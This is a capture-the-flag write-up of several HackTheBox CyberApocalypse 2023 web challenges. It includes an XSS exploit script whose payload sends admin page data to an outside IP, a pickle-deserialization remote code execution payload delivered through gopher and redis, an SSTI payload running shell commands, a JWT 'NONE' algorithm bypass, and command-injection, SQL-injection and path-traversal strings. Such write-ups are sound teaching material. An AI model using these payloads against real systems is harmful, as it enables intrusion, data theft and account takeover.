# HTB-CA23
HackTheBox CyberApocalypse 2k23 writeups (Rowra)

## Web/Spybug
* after registering an agent, you can update its details, which is then reflected on the admin site. `XSS` works!
* the page implements `script-src: self` so we can't use `RFI` or even `inline` scripts. That scripts needs to be local!
* we can upload `wav` files which after being uploaded end up in the `/uploads` directory, with a `uuid` name and no extension. No extension can indeed be loaded as working `js`
* the upload process has some validators but they're all easily cheated: the original extension is irrelevant for our payload and the latter check only validates if the proper wave file magic bytes are present in the file, however, it doesn't need to begin with those to pass the test!
* summarizing the steps are:
1. register an agent
2. craft & upload a malicious javascript-wave file 
3. update the agent's details to implement the XSS, using the previously uploaded javascript file - which is local by now
4. wait for the callback and receive the flag

Due to the sheer complexity of this challenge I programmed it:
```
import requests 
import sys 
 
base = 'http://127.0.0.1:1337' 
base = f'http://{sys.argv[1]}' 
s = requests.Session() 
 
def agent_register(): 
    url = f'{base}/agents/register' 
    r = s.get(url) 
    return r.json() 
 
def agent_upload(agent, payload): 
    url = f'{base}/agents/upload/{agent["identifier"]}/{agent["token"]}' 
    mfd = {'recording': ('test.wav', payload, 'audio/wave')} 
 
    r = s.post(url, files=mfd) 
    if r.status_code == 200: 
        return r.text 
    raise Exception('ERROR failed to upload') 
 
def agent_update(agent, data): 
    url = f'{base}/agents/details/{agent["identifier"]}/{agent["token"]}' 
    r = s.post(url, json=data) 
    return 'SUCCESS' if r.status_code == 200 else 'ERROR' 
 
# step 1 agent regisztráció 
agent = agent_register() 
 
# step 2 malicious wav - javascript feltöltés 
payload = b''' 
window.location = 'http://84.236.80.251:4444/' + document.getElementsByTagName("h2")[0].innerText.split("Welcome back ")[1]; 
''' # a lényeg 
payload += b'\n/*' # új sor + egy komment kezdet, biztos ami biztos 
payload += b'\x52\x49\x46\x46\x2f\x2a\x16\x00\x57\x41\x56\x45' # WAVE magicbyte és/vagy ami kell a backendnek 
payload += b'*/' # van egy `/*` karakter a WAVE magic byte -ban, amire sír a JS, szóval le kell zárni :D 
 
filename = agent_upload(agent, payload) 
print(f'Got filename {filename}') 
 
 
# step 3 XSS az admin panelre ;] 
data = {'hostname': f'<script src="/uploads/{filename}"></script>', 
        'platform': 'pwnd by', 
        'arch': 'RWR'} 
 
print(agent_update(agent, data))
 
```

## Web/Didactic Octo Paddle
* in `middleware/AdminMiddleware.js` you can notice the `else` clause in which `jwt.verify` func. call's 2nd parameter is `null`. This means there's not crypt involved. This obviously means very easily crafted JWTs
* the only `algorithm` matching this is `none`, however, the code's supposed to defend against that with an early return in the code
* with some trial & error I managed to bypass the mentioned early return by using the algorithm `NONE` _(capital)_. Meaning the actual working payload as follows _(parts are separated by a `.` dot)_:
1st part: `echo -n '{"typ":"JWT","alg":"NONE"}' | base64`
2nd part: the one you already have, just change `id` to `1` _(admin's id)_
3rd part: empty _(nothing following the `.`)_
* as the webapp's admin, still need to access `/flag.txt`. The code rendering `/admin` endpoint uses `JSRender NodeJS`. All that was left to do is to register a user with a username that's exploiting SSTI and then check `/admin` page for the flag. Working payload:
`{"username":"{{:\"pwnd\".toString.constructor.call({},\"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()\")()}}","password":"fdg"}`

## Web/Trap Track
* you can read `admin:admin` admin creds from the source code
* you can follow the flow of the code but a check added on the admin page eventually lands at `worker/curltest.py`. It's quite obviously unsanitized, will run anything
* there's a python pickle deserialization which is a pretty bad practice and unsafe if we can control the input. It happens at multiple stages but I chose `application/cache.py`'s `get_job_queue` function as I deemed it pretty stable and easily reproduced at any time. This functions expects a `job_id` after which it'll read the job with that id from redis and unserialize it without any sanitization, again. The API endpoint belonging to this function call is `/api/tracks/<id>/status`
* `libcurl` can do `gopher` and redis may be controller through gopher calls.
* To put it all together and summarize:
1. generate payload:
```
import pickle 
import base64 
import os 
 
class RWR: 
    def __reduce__(self): 
        cmd = '''curl -XPOST http://127.0.0.1:1337/api/tracks/add -d "{\\"trapName\\": \\"`/readflag`\\", \\"trapURL\\": \\"http://1.2.3.4\\"}" -H "Co
ntent-Type: application/json" -H "Cookie: session=<admin cookie here>"''' 
        return os.system, (cmd, ) 
 
 
if __name__ == '__main__': 
    pickled = pickle.dumps(RWR()) 
    b64 = base64.b64encode(pickled).decode() 
    print(f'gopher://127.0.0.1:6379/_hset%20jobs%204444%20{b64}')
```
2. add the `gopher://` link received _(payload)_ on the admin page
3. detonate payload by `GET`ting `/api/tracks/4444/status`
4. go back to the admin site to collect the flag from the name of yet another added entry

## Web/Passman
* register a random user
* play around with the `graphql` queries and realise that `helpers/GraphqlHelper.js` line `#96` `UpdatePassword` does not check anything. A simple auth will do just fine and you can edit anyone's password
* craft a malicious `graphql query`:
{"query":"mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message } }","variables":{"username":"admin","password":"hahayouredone"}}
* login as admin

## Web/Gunhead
* the `/PING` command is pretty shady. Feels like it's passed straight through to shell
* `/ping 127.0.0.1; whoami` works just fine
* `/ping 127.0.0.1; ls /` shows the flag as `/flag.txt`
* `/ping 127.0.0.1; cat /flag.txt`

## Web/Trapped Source
* in the source code you can see the `js` included `/static/js/script.js`
* `script.js` has a function called `checkPin` which checks if entered ping is equal to `CONFIG.correctPin`
* just enter `CONFIG.correctPin` in the browser console and get the correct code `7298`

## Web/Orbital
* in `database.py` you can see that it ojnly queries the user and checks the password later on, trying to prevent sqli. It didnt really work as expected, it's just as vulnerable just maybe a little more difficult. Working payload with `union injection`: `admin" union select "rowra","bb84c3e15018b35b6994f3ad7cb1c453" order by username desc-- -` _(is the username)_ and gecosz is the password
* payload for the `/api/export` endpoint is a simple `LFI`: `{"name": "../signal_sleuth_firmware"}`

## Web/Drobots
* `database.py` hints it's going to be sqli and it's pretty visible too
* login as username `admin` password: `1" or "1"="1"-- -`

